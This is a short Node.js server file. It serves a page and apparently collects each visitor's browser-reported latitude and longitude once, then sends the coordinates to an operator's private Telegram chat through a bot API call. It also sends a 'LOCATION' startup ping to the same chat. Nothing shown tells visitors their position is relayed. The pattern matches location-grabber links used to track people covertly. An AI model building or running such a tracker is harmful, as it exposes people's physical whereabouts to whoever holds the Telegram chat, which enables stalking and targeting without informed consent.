require('dotenv').config();
const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);
const path = require('path');
const https = require('https');

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

function sendTelegram(message) {
    if (!BOT_TOKEN || !CHAT_ID) return;
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
    https.get(url, (res) => {}).on('error', (e) => { });
}

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

io.on('connection', (socket) => {
    let hasSent = false;
    socket.on('send-location', (data) => {
        if (hasSent) return;
        
        const latRef = data.lat >= 0 ? "N" : "S";
        const lngRef = data.lng >= 0 ? "E" : "W";
        const formattedLat = Math.abs(data.lat).toFixed(3);
        const formattedLng = Math.abs(data.lng).toFixed(3);
        
        const telegramMsg = `<b>Acuret LOCATION: ${formattedLat}°${latRef} ${formattedLng}°${lngRef}</b>`;
        sendTelegram(telegramMsg);
        hasSent = true;
    });
});

const PORT = process.env.PORT || 3000;
// Railway fixed IP address logic
http.listen(PORT, '0.0.0.0', () => {
    sendTelegram("<b>Acuret•LOCATION\"🌍\"</b>");
    // Railway needs this log to know it's alive!
    console.log(`Server started on port: ${PORT}`);
});
